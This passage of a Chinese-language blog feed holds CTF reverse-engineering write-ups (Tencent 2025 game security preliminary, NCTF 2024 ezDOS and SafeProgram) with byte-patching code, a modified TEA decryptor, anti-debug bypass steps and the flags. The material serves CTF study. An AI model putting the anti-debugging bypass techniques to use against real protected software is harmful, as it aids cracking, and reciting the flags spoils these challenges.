class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// tea函数原字节</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> tea[<span class="number">149</span>] = &#123;</span><br><span class="line">    <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0xC4</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0x58</span>, <span class="number">0x08</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0x68</span>, <span class="number">0x10</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0x70</span>, <span class="number">0x18</span>, <span class="number">0x48</span>,</span><br><span class="line">    <span class="number">0x89</span>, <span class="number">0x78</span>, <span class="number">0x20</span>, <span class="number">0x41</span>, <span class="number">0x55</span>, <span class="number">0x4C</span>, <span class="number">0x8B</span>, <span class="number">0xEA</span>, <span class="number">0x8B</span>, <span class="number">0x1A</span>, <span class="number">0x45</span>, <span class="number">0x33</span>, <span class="number">0xDB</span>, <span class="number">0x8B</span>, <span class="number">0x7A</span>, <span class="number">0x04</span>,</span><br><span class="line">    <span class="number">0x4C</span>, <span class="number">0x8B</span>, <span class="number">0xC1</span>, <span class="number">0x8B</span>, <span class="number">0x72</span>, <span class="number">0x08</span>, <span class="number">0x8B</span>, <span class="number">0x6A</span>, <span class="number">0x0C</span>, <span class="number">0x44</span>, <span class="number">0x8B</span>, <span class="number">0x09</span>, <span class="number">0x41</span>, <span class="number">0x8D</span>, <span class="number">0x53</span>, <span class="number">0x20</span>,</span><br><span class="line">    <span class="number">0x44</span>, <span class="number">0x8B</span>, <span class="number">0x51</span>, <span class="number">0x04</span>, <span class="number">0x41</span>, <span class="number">0x8B</span>, <span class="number">0xCA</span>, <span class="number">0x45</span>, <span class="number">0x8D</span>, <span class="number">0x9B</span>, <span class="number">0xB9</span>, <span class="number">0x79</span>, <span class="number">0x37</span>, <span class="number">0x9E</span>, <span class="number">0xC1</span>, <span class="number">0xE9</span>,</span><br><span class="line">    <span class="number">0x05</span>, <span class="number">0x41</span>, <span class="number">0x8B</span>, <span class="number">0xC2</span>, <span class="number">0x03</span>, <span class="number">0xCF</span>, <span class="number">0xC1</span>, <span class="number">0xE0</span>, <span class="number">0x04</span>, <span class="number">0x03</span>, <span class="number">0xC3</span>, <span class="number">0x33</span>, <span class="number">0xC8</span>, <span class="number">0x43</span>, <span class="number">0x8D</span>, <span class="number">0x04</span>,</span><br><span class="line">    <span class="number">0x13</span>, <span class="number">0x33</span>, <span class="number">0xC8</span>, <span class="number">0x44</span>, <span class="number">0x03</span>, <span class="number">0xC9</span>, <span class="number">0x41</span>, <span class="number">0x8B</span>, <span class="number">0xC9</span>, <span class="number">0x41</span>, <span class="number">0x8B</span>, <span class="number">0xC1</span>, <span class="number">0xC1</span>, <span class="number">0xE9</span>, <span class="number">0x05</span>, <span class="number">0xC1</span>,</span><br><span class="line">    <span class="number">0xE0</span>, <span class="number">0x04</span>, <span class="number">0x03</span>, <span class="number">0xCD</span>, <span class="number">0x03</span>, <span class="number">0xC6</span>, <span class="number">0x33</span>, <span class="number">0xC8</span>, <span class="number">0x43</span>, <span class="number">0x8D</span>, <span class="number">0x04</span>, <span class="number">0x0B</span>, <span class="number">0x33</span>, <span class="number">0xC8</span>, <span class="number">0x44</span>, <span class="number">0x03</span>,</span><br><span class="line">    <span class="number">0xD1</span>, <span class="number">0x48</span>, <span class="number">0x83</span>, <span class="number">0xEA</span>, <span class="number">0x01</span>, <span class="number">0x75</span>, <span class="number">0xBD</span>, <span class="number">0x41</span>, <span class="number">0x5D</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0x5C</span>, <span class="number">0x24</span>, <span class="number">0x08</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>,</span><br><span class="line">    <span class="number">0x6C</span>, <span class="number">0x24</span>, <span class="number">0x10</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0x74</span>, <span class="number">0x24</span>, <span class="number">0x18</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0x7C</span>, <span class="number">0x24</span>, <span class="number">0x20</span>, <span class="number">0x45</span>, <span class="number">0x89</span>, <span class="number">0x08</span>,</span><br><span class="line">    <span class="number">0x45</span>, <span class="number">0x89</span>, <span class="number">0x50</span>, <span class="number">0x04</span>, <span class="number">0xC3</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> P_0[<span class="number">0x1000</span>]&#123;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> xmmword_140004000[<span class="number">16</span>] = &#123;</span><br><span class="line">    <span class="number">0x58</span>, <span class="number">0x41</span>, <span class="number">0x8B</span>, <span class="number">0xC9</span>, <span class="number">0x41</span>, <span class="number">0x8B</span>, <span class="number">0xC1</span>, <span class="number">0xC1</span>, <span class="number">0xE0</span>, <span class="number">0x04</span>, <span class="number">0xC1</span>, <span class="number">0xE9</span>, <span class="number">0x05</span>, <span class="number">0x33</span>, <span class="number">0xC8</span>, <span class="number">0x41</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> xmmword_140004010[<span class="number">16</span>] = &#123;</span><br><span class="line">    <span class="number">0x8B</span>, <span class="number">0xC3</span>, <span class="number">0x48</span>, <span class="number">0xC1</span>, <span class="number">0xE8</span>, <span class="number">0x0B</span>, <span class="number">0x41</span>, <span class="number">0x03</span>, <span class="number">0xC9</span>, <span class="number">0x83</span>, <span class="number">0xE0</span>, <span class="number">0x03</span>, <span class="number">0x41</span>, <span class="number">0x8B</span>, <span class="number">0x44</span>, <span class="number">0x85</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> xmmword_140004020[<span class="number">16</span>] = &#123;</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x41</span>, <span class="number">0x03</span>, <span class="number">0xC3</span>, <span class="number">0x33</span>, <span class="number">0xC8</span>, <span class="number">0x44</span>, <span class="number">0x03</span>, <span class="number">0xD1</span>, <span class="number">0x48</span>, <span class="number">0x83</span>, <span class="number">0xEA</span>, <span class="number">0x01</span>, <span class="number">0x48</span>, <span class="number">0xB8</span>, <span class="number">0x00</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> xmmword_140004030[<span class="number">16</span>] = &#123;</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0xB9</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> dword_140004040[<span class="number">4</span>] = &#123;</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x75</span>, <span class="number">0x02</span>, <span class="number">0xFF</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> word_140004044[<span class="number">2</span>] = &#123;</span><br><span class="line">    <span class="number">0xE0</span>, <span class="number">0xFF</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> byte_140004046[<span class="number">2</span>] = &#123;</span><br><span class="line">    <span class="number">0xE1</span>, <span class="number">0x00</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> qword_140004048[<span class="number">8</span>] = &#123;</span><br><span class="line">    <span class="number">0x50</span>, <span class="number">0x48</span>, <span class="number">0xB8</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> dword_140004050[<span class="number">4</span>] = &#123;</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xFF</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> byte_140004054[<span class="number">1</span>] = &#123;</span><br><span class="line">    <span class="number">0xE0</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">DWORD64 qword_<span class="number">1400041E0</span> = <span class="number">0</span>;</span><br><span class="line">DWORD dword_<span class="number">1400041E8</span> = <span class="number">0</span>;</span><br><span class="line">BYTE byte_1400041EC = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 对tea函数修改的函数</span></span><br><span class="line"><span class="function"><span class="type">void</span> __fastcall <span class="title">sub_14000A35B</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> n64; <span class="comment">// ebx</span></span><br><span class="line">    <span class="type">char</span>* v3; <span class="comment">// rdx</span></span><br><span class="line">    <span class="type">int</span> i; <span class="comment">// ecx</span></span><br><span class="line">    <span class="type">unsigned</span> __int64 v5; <span class="comment">// rax</span></span><br><span class="line">    <span class="type">char</span>* v6; <span class="comment">// rdx</span></span><br><span class="line">    <span class="type">int</span> j; <span class="comment">// ecx</span></span><br><span class="line">    <span class="type">unsigned</span> __int64 v8; <span class="comment">// rax</span></span><br><span class="line">    <span class="type">char</span>* v9; <span class="comment">// rdx</span></span><br><span class="line">    <span class="type">unsigned</span> __int64* v10; <span class="comment">// rcx</span></span><br><span class="line">    <span class="type">unsigned</span> __int64 v11; <span class="comment">// r8</span></span><br><span class="line">    <span class="type">unsigned</span> __int64 v12; <span class="comment">// rax</span></span><br><span class="line">    <span class="type">unsigned</span> __int8 CurrentIrql; <span class="comment">// dl</span></span><br><span class="line">    <span class="type">unsigned</span> __int64 v14; <span class="comment">// rcx</span></span><br><span class="line">    <span class="type">unsigned</span> __int64 v15; <span class="comment">// rax</span></span><br><span class="line">    <span class="type">unsigned</span> __int64 v16; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">    n64 = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    v3 = (<span class="type">char</span>*)&amp;xmmword_140004020 + <span class="number">15</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">64</span>; i += <span class="number">8</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        v5 = (<span class="type">unsigned</span> __int64)(a1 + <span class="number">119</span>) &gt;&gt; i;</span><br><span class="line">        *v3++ = v5;</span><br><span class="line">    &#125;</span><br><span class="line">    v6 = (<span class="type">char</span>*)&amp;xmmword_140004030 + <span class="number">9</span>;</span><br><span class="line">    <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; <span class="number">64</span>; j += <span class="number">8</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        v8 = (<span class="type">unsigned</span> __int64)(a1 + <span class="number">52</span>) &gt;&gt; j;</span><br><span class="line">        *v6++ = v8;</span><br><span class="line">    &#125;</span><br><span class="line">    v9 = (<span class="type">char</span>*)&amp;qword_140004048 + <span class="number">3</span>;</span><br><span class="line">    v10 = (<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>*)P_0;</span><br><span class="line">    <span class="built_in">memcpy</span>(P_0, xmmword_140004000, <span class="number">16</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(P_0 + <span class="number">16</span>, xmmword_140004010, <span class="number">16</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(P_0 + <span class="number">16</span> * <span class="number">2</span>, xmmword_140004020, <span class="number">16</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(P_0 + <span class="number">16</span> * <span class="number">3</span>, xmmword_140004030, <span class="number">16</span>);</span><br><span class="line">    *((DWORD*)P_0 + <span class="number">16</span>) = *(DWORD*)dword_140004040;</span><br><span class="line">    *((WORD*)P_0 + <span class="number">34</span>) = *(WORD*)word_140004044;</span><br><span class="line">    *((BYTE*)P_0 + <span class="number">70</span>) = *(BYTE*)byte_140004046;</span><br><span class="line">    v11 = (<span class="type">unsigned</span> __int64)P_0;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">        v12 = v11 &gt;&gt; n64;</span><br><span class="line">        n64 += <span class="number">8</span>;</span><br><span class="line">        *v9++ = v12;</span><br><span class="line">    &#125; <span class="keyword">while</span> (n64 &lt; <span class="number">64</span>);</span><br><span class="line"></span><br><span class="line">    qword_<span class="number">1400041E0</span> = *(DWORD64*)(a1 + <span class="number">86</span>);</span><br><span class="line">    dword_<span class="number">1400041E8</span> = *(DWORD*)(a1 + <span class="number">94</span>);</span><br><span class="line">    byte_1400041EC = *(BYTE*)(a1 + <span class="number">98</span>);</span><br><span class="line">    *(DWORD64*)(a1 + <span class="number">86</span>) = *(DWORD64*)qword_140004048;</span><br><span class="line">    *(DWORD*)(a1 + <span class="number">94</span>) = *(DWORD*)dword_140004050;</span><br><span class="line">    *(BYTE*)(a1 + <span class="number">98</span>) = *(BYTE*)byte_140004054;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 修改tea加密函数代码字节</span></span><br><span class="line">    <span class="built_in">sub_14000A35B</span>((<span class="type">long</span> <span class="type">long</span>)tea);</span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>编译使用IDA动调，并按c分析tea数组处的代码，发现分成了三块，手动将三块合并到一块代码，并修复部分跳转的地址，即可得到完整的代码。</p><p><img src="/2025/03/31/2025Tencent/21.png" alt="alt text"></p><p><img src="/2025/03/31/2025Tencent/22.png" alt="alt text"></p><p><img src="/2025/03/31/2025Tencent/23.png" alt="alt text"></p><p>合并完的代码如下：</p><p><img src="/2025/03/31/2025Tencent/24.png" alt="alt text"></p><p>反编译得到修改后的魔改tea加密</p><p><img src="/2025/03/31/2025Tencent/25.png" alt="alt text"></p><p>即可编写得到对应的解密代码：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">tea_decrypt</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span>* Input, <span class="type">int</span>* Key)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> v6 = Input[<span class="number">0</span>];</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> v8 = Input[<span class="number">1</span>];</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// sum从32开始</span></span><br><span class="line">    sum = (<span class="number">-0x61C88647</span>) * <span class="number">32</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++) </span><br><span class="line">    &#123;</span><br><span class="line">        v8 -= (sum + Key[(sum &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>]) ^ (v6 + ((v6 &lt;&lt; <span class="number">4</span>) ^ (v6 &gt;&gt; <span class="number">5</span>)));</span><br><span class="line">        v6 -= (sum + v8) ^ (Key[<span class="number">0</span>] + (v8 &lt;&lt; <span class="number">4</span>)) ^ (Key[<span class="number">1</span>] + (v8 &gt;&gt; <span class="number">5</span>));</span><br><span class="line">        sum += <span class="number">0x61C88647</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Input[<span class="number">0</span>] = v6;</span><br><span class="line">    Input[<span class="number">1</span>] = v8;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>进行对unk_140004064密文解密即可，不过注意一点，这边是从-1处开始判断，也就是unk_140004064-4处开始是密文。</p><p><img src="/2025/03/31/2025Tencent/26.png" alt="alt text"></p><p>提取出来就是42的DWORD数据，和上面的判断数值对应上了。</p><p><img src="/2025/03/31/2025Tencent/27.png" alt="alt text"></p><h2 id="解密"><a href="#解密" class="headerlink" title="解密"></a>解密</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 魔改tea解密函数</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">tea_decrypt</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> *Input, <span class="type">int</span> *Key)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> v6 = Input[<span class="number">0</span>];</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> v8 = Input[<span class="number">1</span>];</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> sum = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    sum = (<span class="number">-0x61C88647</span>) * <span class="number">32</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        v8 -= (sum + Key[(sum &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>]) ^ (v6 + ((v6 &lt;&lt; <span class="number">4</span>) ^ (v6 &gt;&gt; <span class="number">5</span>)));</span><br><span class="line">        v6 -= (sum + v8) ^ (Key[<span class="number">0</span>] + (v8 &lt;&lt; <span class="number">4</span>)) ^ (Key[<span class="number">1</span>] + (v8 &gt;&gt; <span class="number">5</span>));</span><br><span class="line">        sum += <span class="number">0x61C88647</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Input[<span class="number">0</span>] = v6;</span><br><span class="line">    Input[<span class="number">1</span>] = v8;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// flag密文</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> enc[<span class="number">42</span>] = &#123;</span><br><span class="line">    <span class="number">0x0EC367B8</span>, <span class="number">0xC9DA9044</span>, <span class="number">0xDA6C2DEB</span>, <span class="number">0x88DDC9C3</span>, <span class="number">0x32A01575</span>, <span class="number">0x231DD0B4</span>, <span class="number">0x4B9E8A74</span>, <span class="number">0xD75D3E74</span>,</span><br><span class="line">    <span class="number">0xEAAB8712</span>, <span class="number">0xE704E888</span>, <span class="number">0xE01A31AC</span>, <span class="number">0xECAE205C</span>, <span class="number">0xA7BE7467</span>, <span class="number">0x0C6252A3</span>, <span class="number">0x1AEFEC4E</span>, <span class="number">0xC40DED44</span>,</span><br><span class="line">    <span class="number">0xC3C842CC</span>, <span class="number">0xDE4A0C0E</span>, <span class="number">0x7C24F3FC</span>, <span class="number">0x8FB8D001</span>, <span class="number">0x11153E6E</span>, <span class="number">0x530ED15C</span>, <span class="number">0xF4214811</span>, <span class="number">0xBEB517E0</span>,</span><br><span class="line">    <span class="number">0x63F91634</span>, <span class="number">0x4D96F8A5</span>, <span class="number">0xFE23EAC8</span>, <span class="number">0x2C607ADF</span>, <span class="number">0xCC43D85C</span>, <span class="number">0xFF186C5B</span>, <span class="number">0x8763E1A5</span>, <span class="number">0x9187BD58</span>,</span><br><span class="line">    <span class="number">0x87D1069B</span>, <span class="number">0xD7878D7B</span>, <span class="number">0x836E6B68</span>, <span class="number">0x55A0C63F</span>, <span class="number">0xD979FDB3</span>, <span class="number">0x3E524DEE</span>, <span class="number">0x7AB35C82</span>, <span class="number">0xA2F4DA8D</span>,</span><br><span class="line">    <span class="number">0x1708BA4C</span>, <span class="number">0x710653E6</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// tea解密key</span></span><br><span class="line"><span class="type">int</span> key[<span class="number">4</span>]&#123;<span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;C&#x27;</span>, <span class="string">&#x27;E&#x27;</span>, <span class="string">&#x27;6&#x27;</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 42个数据，2个2个进行tea解密</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">42</span>; i += <span class="number">2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">tea_decrypt</span>((<span class="type">unsigned</span> <span class="type">int</span> *)((DWORD64)enc + i * <span class="number">4</span>), key);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 输出42个解密后数据</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">42</span>; i++)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%X &quot;</span>, enc[i]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Out"><a href="#Out" class="headerlink" title="Out"></a>Out</h3><p><code>33 28 13 0 2D 16 40 41 13 2A 12 4F 45 4B 1F 14 39 49 3B 34 3A 26 3B 19 24 2B 22 5 4C E 0 4C 3B 4 2B 1D 5 39 16 22 3D B</code></p><h3 id="CyberChef"><a href="#CyberChef" class="headerlink" title="CyberChef"></a>CyberChef</h3><p>xor(‘sxx’) -&gt; Reverse -&gt; Base58 Decode(换表)</p><p><img src="/2025/03/31/2025Tencent/28.png" alt="alt text"></p><p>密文：<code>We1C0me!T0Z0Z5GamESecur1t9*CTf</code></p><h2 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h2><p><code>flag&#123;ACE_We1C0me!T0Z0Z5GamESecur1t9*CTf&#125;</code></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;2025腾讯游戏安全技术竞赛-PC客户端安全-初赛WP&quot;&gt;&lt;a href=&quot;#2025腾讯游戏安全技术竞赛-PC客户端安全-初赛WP&quot; class=&quot;headerlink&quot; title=&quot;2025腾讯游戏安全技术竞赛 PC客户端安全 初赛WP&quot;&gt;&lt;/a&gt;2025腾</summary>
      
    
    
    
    
    <category term="CTF比赛" scheme="https://tkazer.github.io/tags/CTF%E6%AF%94%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>NCTF2024</title>
    <link href="https://tkazer.github.io/2025/03/24/NCTF2024/"/>
    <id>https://tkazer.github.io/2025/03/24/NCTF2024/</id>
    <published>2025-03-24T11:12:53.000Z</published>
    <updated>2025-03-24T13:41:39.058Z</updated>
    
    <content type="html"><![CDATA[<h1 id="NCTF-2024-Reverse-WP"><a href="#NCTF-2024-Reverse-WP" class="headerlink" title="NCTF 2024 Reverse WP"></a>NCTF 2024 Reverse WP</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这次也是擦边#6拿下奖金，组队的师傅们都十分强大，合力拿下。</p><p>Re这次摸了三题，剩一题安卓不太熟悉安卓逆向看了一眼就没做，但是赛后发现其实没那么难（。ezDOS 8086汇编题刚好撞上我GHCTF出的题，很熟悉直接秒了，偷摸了个一血。然后gogo这题的golang vm研究了挺久，拿下了三血，实际加密不是很复杂。总体下来这几题re出的都挺不错，收获也很多，对vm的题型也更加熟悉了。</p><h2 id="ezDOS"><a href="#ezDOS" class="headerlink" title="ezDOS"></a>ezDOS</h2><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>程序中间出现的花指令都直接nop去除，然后Apply patch到程序。</p><p><img src="/2025/03/24/NCTF2024/image.png" alt="alt text"></p><p>程序要求输入38长度字符串，然后进行一系列变种类RC4算法加密，然后与0x141地址的38字节数据进行比对。</p><p><img src="/2025/03/24/NCTF2024/image-1.png" alt="alt text"></p><p>使用dosbox动调，在FA代码处是对取出的al对输入的字符串进行xor加密。0x32是取出的异或值，0x31是输入的字符’1’。</p><p><img src="/2025/03/24/NCTF2024/image-2.png" alt="alt text"></p><p><img src="/2025/03/24/NCTF2024/image-3.png" alt="alt text"></p><p>直接debug一直循环执行这边，即可拿到对输入字符串异或的一系列异或值。</p><p><code>32 7d 59 7a f3 0d b3 7b 64 8c eb 28 c4 a4 50 30 a0 ed 27 6a e3 76 69 0c da 28 f8 08 ba a6 17 3e 12 59 45 06 4e f1</code></p><p>取出0x142地址的38字节，进行异或即可得到解密flag。</p><h3 id="解密"><a href="#解密" class="headerlink" title="解密"></a>解密</h3><p><img src="/2025/03/24/NCTF2024/image-4.png" alt="alt text"></p><h3 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h3><p><code>NCTF&#123;Y0u+Ar3_Assemb1y_M4st3r_5d0b497e&#125;</code></p><h2 id="SafeProgram"><a href="#SafeProgram" class="headerlink" title="SafeProgram"></a>SafeProgram</h2><h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><p>核心加密是一个SM4加密。</p><p><img src="/2025/03/24/NCTF2024/image-5.png" alt="alt text"></p><p>查看byte_14002A0D0数组交叉引用，发现在其他函数被访问过。</p><p><img src="/2025/03/24/NCTF2024/image-6.png" alt="alt text"></p><p><img src="/2025/03/24/NCTF2024/image-7.png" alt="alt text"></p><p>发现是在VEH异常Handler里面调用的，第一个AddVectoredExceptionHandler得直接nop，不然运行就直接退出。</p><p><img src="/2025/03/24/NCTF2024/image-8.png" alt="alt text"></p><p><img src="/2025/03/24/NCTF2024/image-9.png" alt="alt text"></p><p><img src="/2025/03/24/NCTF2024/image-10.png" alt="alt text"></p><p>然后在这个函数开头断点，使用ScyllaHide插件一键去除反调试，防止其他地方的反调试。</p><p><img src="/2025/03/24/NCTF2024/image-11.png" alt="alt text"></p><p>main函数可以看到要求输入格式为NCTF{…}的长度38字符串，然后运行到箭头函数会触发除0异常，然后就会触发VEH那个Handler导致那个byte数组被修改，需要提取的数据是被改后的。</p><p><img src="/2025/03/24/NCTF2024/image-12.png" alt="alt text"></p><p>动调时提取这三个数组数据，进行解密即可。</p><p><img src="/2025/03/24/NCTF2024/image-13.png" alt="alt text"></p><p>key是main函数两次memcpy那边的数据，结果如下。</p><p><img src="/2025/03/24/NCTF2024/image-14.png" alt="alt text"></p><h3 id="解密-1"><a href="#解密-1" class="headerlink" title="解密"></a>解密</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span 